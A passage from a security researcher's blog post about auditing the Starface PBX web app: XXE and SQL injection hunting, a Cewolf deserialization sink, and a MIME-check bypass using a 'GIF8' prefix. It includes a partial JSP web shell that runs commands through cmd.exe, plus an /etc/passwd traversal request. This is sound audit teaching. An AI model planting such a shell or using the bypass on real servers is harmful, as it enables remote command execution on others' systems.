		<init-param>
			<param-name>authConverterFactory</param-name>
			<param-value>de.starface.integration.uci.ucp.connectors.UrlAccountAuthTokenConverterFactory</param-value>
		</init-param>
		<init-param>
			<param-name>useAuthenticationReporter</param-name>
			<param-value>true</param-value>
		</init-param>
	</servlet>
[...]
```

So I had a look at `de.starface.com.rpc.xmlrpc.http.XmlRpcServlet.doPost(HttpServletRequest, HttpServletResponse)` first. Obviously, the next code snippet showed, something received and **parsed** XML-based data from an HTTP request.

```java
/* 151 */       HttpXmlRpcObjectParser parser = new HttpXmlRpcObjectParser();
/*     */       
/* 153 */       HttpXmlRpcRequest httpRequest = (HttpXmlRpcRequest)parser.parseStreamAsServer(req.getInputStream()); // <-- req being a HttpServletRequest
/*     */       
/* 155 */       Object returnValue = executor.execute(httpRequest.getMethodName(), httpRequest.getParameters(), 
/* 156 */           determineUrlFromCaller(req));
```

We landed at `de.starface.com.rpc.xmlrpc.http.HttpXmlRpcObjectParser.parse(InputStream, boolean)`.

```java
/* 68 */       XmlPullParser pullParser = new MXParser();
/* 69 */       BufferedReader reader = new BufferedReader(new InputStreamReader(stream, "UTF-8"));
/* 70 */       pullParser.setFeature("http://xmlpull.org/v1/doc/features.html#process-namespaces", true);
/* 71 */       pullParser.setInput(reader);
/*    */       
/* 73 */       HttpXmlRpcObjectBuilder objectBuilder = new HttpXmlRpcObjectBuilder();
/* 74 */       XmlRpcObjectParser objectParser = new XmlRpcObjectParser(objectBuilder, "query");
/*    */       
/* 76 */       objectParser.parse(pullParser);
```

Interestingly, the `org.xmlpull.mxp1.MXParser` was totally unknown to me at this time (and somehow is still today). If you're familiar with **XXE** vulnerabilities, this should activate your "vulnerability detection brain cells" (still to be discovered by neuroscientists). There was even an XML parsing feature explicitly activated programmatically: `setFeature("http://xmlpull.org/v1/doc/features.html#process-namespaces", true)`. That *could* mean that all the other dangerous parsing features wouldn't be active and therefore not exploitable. Searching for the proper JAR file in the VM file system revealed a `xmlpull-1.1.3.1.jar`. First information on a Java library could be found on the project website or the *Maven Repository website* [https://mvnrepository.com/artifact/xmlpull/xmlpull](https://mvnrepository.com/artifact/xmlpull/xmlpull). Version `1.1.3.1` had a release date of 2017, another interesting indicator! No CVEs or publicly known vulnerabilities for this library were found. My recommendation would then be: *building a toy project* to play with. I didn't do this, yet. So this might be another side project anyone could start and then blog about it (\*hint\*).

# Top-Down vs. Bottom-Up

So far, I explained finding vulnerabilities by a kind of **Top-Down** approach but everybody is talking about using `grep` to find the juicy stuff, right? Well, that's also what I'm doing but I try to hold myself back until I already got a good overview on the attack surface and I definitely understand what the application is doing from a functional and technical point of view. You could have started with something like this in the beginning

```bash
grep -rl 'readObject()' --include='*.java'
```

and maybe would have even found the `XmlReader` RCE. But I always suggest to not accelerate to full speed at the beginning. You will make your security code audit inefficient and also hit your frustration boundary a lot faster!

So what are examples for the **Bottom-Up** approach? Basically, I constantly maintain a list of keywords for dangerous functions, objects etc. for different programming languages: command injections, SQL injections, XXE, deserialization and more.

I'll just give one example I used: SQL injection. 

```bash
grep -ril executeQuery | xargs -I {} grep -Li preparedstatement {}
```

`executeQuery` is a well-known method name for executing SQL queries for various Java SQL APIs. The same is true for the `PreparedStatement` keyword: our enemy, because we don't "want" them to use Prepared SQL Statements but rather things like good old plain string concatenation.

```bash
$ grep -ril executeQuery | xargs -I {} grep -Li preparedstatement {}
com/microsoft/sqlserver/jdbc/SQLServerBulkCopy.java
com/microsoft/sqlserver/jdbc/SQLServerXAResource.java
com/microsoft/sqlserver/jdbc/SQLServerStatement.java
com/mysql/cj/jdbc/StatementWrapper.java
com/mysql/cj/jdbc/admin/TimezoneDump.java
com/mysql/cj/jdbc/MysqlXAConnection.java
com/mysql/cj/jdbc/integration/c3p0/MysqlConnectionTester.java
com/mysql/cj/jdbc/interceptors/ServerStatusDiffInterceptor.java
de/vertico/starface/phonesetup/adapter/PattonAdapter.java
de/vertico/starface/phonesetup/adapter/DefaultPhoneHttpAdapter.java
de/vertico/starface/persistence/connector/StatisticsHandler.java # well check this
[...]
```

We definitely got a long list of hits. These could have been all *false positives* but also we might had **missed** a lot. Why? Because if one Java source file would have contained `n` SQL execute statements with Prepared Statements and just **one of them** would have used string concatenation being vulnerable to SQL injection, we would have missed it. So be careful about what your `grep` command does **in detail**.

Let's have a look at `de.vertico.starface.persistence.connector.StatisticsHandler`.
The first `executeQuery` was used in this method:

```java
/*      */   private ResultSet getLineUsageData(Connection con, int accountCategory, long userId, long groupId, int directionCategory, TimeRange selectedTimeRange) throws SQLException {
/*  196 */     StringBuffer buf = new StringBuffer();
/*      */     
/*  198 */     buf.append("SELECT c.id, callid, callleguuid, calleraccountid, callercallerid, calledaccountid, calledcallerid,");
/*  199 */     buf.append(" starttime, ringingtime, linktime, callresulttime, callresult, lineid, wirename, linename,");
/*  200 */     buf.append(" incoming, answered, duration, a1.login AS callerlogin, a2.login AS calledlogin");
/*      */     
[...]
/*  220 */     buf.append(" ORDER BY callid, starttime");
/*      */     
/*  222 */     Statement stmt = con.createStatement();
/*      */     
/*  224 */     stmt.setFetchSize(100);
/*  225 */     return stmt.executeQuery(buf.toString());
/*      */   }
```

Well, the `grep` worked just fine but the method parameters were not used at all. Even if they'd have been used with concatenation to build the SQL string buffer, they were mainly *number formats*. I.e. you could expect something like a `NumberFormatException` before anything would have hit your SQL query execution.

What about this method?

```java
/*      */   public void deleteFromVoicemailTable(String voicemailListId, String cdrid) throws SQLException {
/*  576 */     con = null;
/*      */     try {
/*  578 */       con = getConnection();
/*  579 */       con.setAutoCommit(false);
/*  580 */       Statement stmt = con.createStatement();
/*  581 */       if (StringUtils.isNotBlank(voicemailListId)) {
/*  582 */         String sql = "DELETE FROM cdrvoicemail WHERE id=" + voicemailListId;
/*  583 */         stmt.executeUpdate(sql);
/*  584 */         stmt.clearBatch();
/*  585 */         String sql1 = "DELETE FROM cdrtovoicemail WHERE idcdrvoicemail=" + voicemailListId;
/*  586 */         stmt.executeUpdate(sql1);
/*  587 */         stmt.clearBatch();
/*  588 */         String sql2 = "DELETE FROM cdrsummarytovoicemail WHERE idcdrvoicemail=" + voicemailListId;
/*      */         
/*  590 */         stmt.executeUpdate(sql2);
[...]
```

This looked a lot better to me, didn't it? Now, you could use the **Call Hierarchy** function of Eclipse to search your way up to potentially controlled user input.

![Call Hierarchy](/assets/images/auditfails/sqlcallhierarchy.png)

I didn't find a quick win, yet. But again feel free to hack with me together for some code audit fun purposes.

A week later I stumbled over another idea, triggered by one of my *Bottom-Up* `grep`s: `readObject()`: `de/laures/cewolf/storage/FileStorage.java`. I instantly remembered a cool exploit by *mr_me* for **ManageEngine Desktop Central**. There was an insecure deserialization issue described at his [website](https://srcincite.io/pocs/src-2020-0011.py.txt). It used the `de.laures.cewolf.CewolfRenderer` to achieve RCE after uploading a malicious file.

I had a look again in the `web.xml` file to check if there were any URL patterns triggering this Servlet. I found this:

```xml
[...]
	<servlet>
		<servlet-name>CewolfServlet</servlet-name>
		<servlet-class>de.laures.cewolf.CewolfRenderer</servlet-class>
		<load-on-startup>1</load-on-startup>
	</servlet>
[...]
	<servlet-mapping>
		<servlet-name>CewolfServlet</servlet-name>
		<url-pattern>/config/statistic/statrender/*</url-pattern>
	</servlet-mapping>
```

Alright, I thought, let's be sure first that the same insecure deserialization code was available in the library used by Starface: `de.laures.cewolf.CewolfRenderer.doGet(HttpServletRequest, HttpServletResponse)`.

```java
[...]
/* 135 */     String imgKey = request.getParameter("img");
/* 136 */     if (imgKey == null) {
/*     */       
/* 138 */       logAndRenderException(new ServletException("no 'img' parameter provided for Cewolf servlet."), response, width, height);
/*     */       return;
/*     */     } 
/* 141 */     Storage storage = this.config.getStorage();
/* 142 */     ChartImage chartImage = storage.getChartImage(imgKey, request);
[...]
```

The `imgKey` we controlled, indeed. And we also found the code `de.laures.cewolf.storage.FileStorage.getChartImage(String, HttpServletRequest)`:

```java
/*     */   public ChartImage getChartImage(String id, HttpServletRequest request) {
/* 108 */     ChartImage res = null;
/* 109 */     ObjectInputStream ois = null;
/*     */     try {
/* 111 */       ois = new ObjectInputStream(new FileInputStream(getFileName(id)));
/* 112 */       res = (ChartImage)ois.readObject();
/* 113 */       ois.close();
/* 114 */     } catch (Exception ex) {
/* 115 */       ex.printStackTrace();
/*     */     }
[...]
```

Nice! **But** I of course needed a upload function letting me store a malicious serialized object into a file with a specific path (or I could have controlled the path to). So I focused on the most obvious file upload: **upload an avatar for my profile**. Logged in as an unprivileged user `0002` again, I searched and found the profile function quickly.

![Profile UI](/assets/images/auditfails/profileUI.png)

I started with a valid image borrowed from my favorite fake profile contributor [https://thispersondoesnotexist.com/](https://thispersondoesnotexist.com/). I observed a POST request to `http://192.168.2.103/frontend/preferences/display/data/avatar/upload.do?token=[...]` with **multipart/form-data**.

![Profile Multi Form](/assets/images/auditfails/profilemultiform.png)

Interestingly, the response contained a download link for the image as well

```html
<table style="background-image: url('/download/starface1604513874694340454.jpeg?key=Su2UMZiXNl3Koo6swU487M7q6CN6gP');"
```

and guess what: the same file name was found on the VM's file system at `/var/cache/tomcat/temp/starface1604513874694340454.jpeg`. So from the response we could tell where a file landed and what it's name would be. Exactly what we needed. But we were not there, yet. We wanted to upload something malicious, right?

We started with something obvious, a **JSP file** but all we got was an error:
`File has wrong MIME type, must be one of image/png, image/jpeg, image/gif`.
But a new file was created at `/var/cache/tomcat/temp/starface7442021089817434947.jsp` with the JSP code content. Unfortunately, we didn't get the *download link* in the response if an error occurred. But I was on fire, motivation high, so I thought: **let's bypass this MIME type check**.

I drilled down the code starting from the Struts action until I hit `de.vertico.starface.helpers.FileUploadCheck.checkMimeType()`.

```java
/*     */   void checkMimeType() throws FileUploadCheckException {
/* 270 */     if (this.mimeTypes.isEmpty()) {
/*     */       return;
/*     */     }
/*     */ 
/*     */     
/*     */     try {
/* 276 */       ContentInfo info = this.magicUtil.findMatch(this.file);
/*     */ 
/*     */       
/* 279 */       if (info == null || this.mimeTypes.stream().noneMatch(s -> info.getMimeType().equalsIgnoreCase(s))) {
/* 280 */         throw new FileUploadCheckException("jsp.error.upload.wrong.mime.type", String.join(", ", this.mimeTypes));
/*     */       }
[...]
```

I then followed the call to `com.j256.simplemagic.ContentInfoUtil.findMatch(File)` and you might have realized already that the **namespace changed**. We hit another library code, no Starface code anymore. Searching at the VM's file system revealed the JAR file of the library located at `webapps/starface/WEB-INF/lib/simplemagic-1.16.jar`.

The input for the MIME type definitions came from a file `magic.gz` in the library's JAR itself. This file was well-structured for every type based on magic bytes and partially subsequent bytes.

```
0       string          SIMPLE\x20\x20= FITS data
!:mime  application/fits
[...]
```

Knowing which image file types were accepted in Starface, I could focus on the `magic.gz` byte definitions for those. Another principle I try to follow: always try the simpliest things first. Some MIME type definitions included complex byte structure checks, some others didn't. What I got was this:

```
[...]
0	string		GIF8		GIF image data
!:mime	image/gif
[...]
```

The comparisons began at the very first byte of our input stream and checked the first four bytes being equal to `GIF8`. And indeed, I was able to upload JSP code, even preserving the file extension, with something like this:

```
GIF8<%@ page import="java.util.*,java.io.*"%>
<%
%>
<HTML><BODY>
Commands with JSP
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
<%
if (request.getParameter("cmd") != null) {
    out.println("Command: " + request.getParameter("cmd") + "<BR>");

    Process p;
    if ( System.getProperty("os.name").toLowerCase().indexOf("windows") != -1){
        p = Runtime.getRuntime().exec("cmd.exe /C " + request.getParameter("cmd"));
[...]
```

I even tried to copy this file into the **Tomcat ROOT directory** manually and was surprised that Tomcat happily served this file as JSP despite the `GIF8` prefix. We learnt something new!

Current status:

1. We could upload a malicious file thanks to a MIME type check bypass.
2. We didn't have to hold a special permission but any authenticated user.
3. We knew the file name and location on the file system.

We didn't test this with a serialized object instead of a JSP file but wanted to check the `CewolfServlet` call first. 

We made a request to `http://192.168.2.103/config/statistic/statrender?img=/etc/passwd` and **hit the breakpoint**

![CeWolf Hit](/assets/images/auditfails/cewolfhit.png)

with our desired parameter

![CeWolf Param](/assets/images/auditfails/cewolfparam.png)

and **failed**

![CeWolf Fail](/assets/images/auditfails/cewolffail.png)

(...twice if you check the processing of `imgKey` more closely).

No `de.laures.cewolf.storage.FileStorage` object here but `de.laures.cewolf.storage.TransientSessionStorage`. Guess what? No `readObject()` anymore.

**Conclusion of this journey**: 
1. We managed to find a dangerous file upload.
2. We failed to chain it with a previously known deserialization issue of a library.

# More Fails

You're looking for more fails? Look at `struts.xml` again and draw your own conclusions.

```xml
[...]
	<constant name="struts.additional.excludedPatterns" value="^(action|method):.*" />
	<constant name="struts.enable.DynamicMethodInvocation" value="true" />
	<constant name="struts.devMode" value="false" />
[...]
```

# Last Words

This blog post already became a bit too long so I stop here with my fail compilation. I hope you learnt something about the methods I use, common pitfalls and some inspiration for a proper mindset on security code auditing.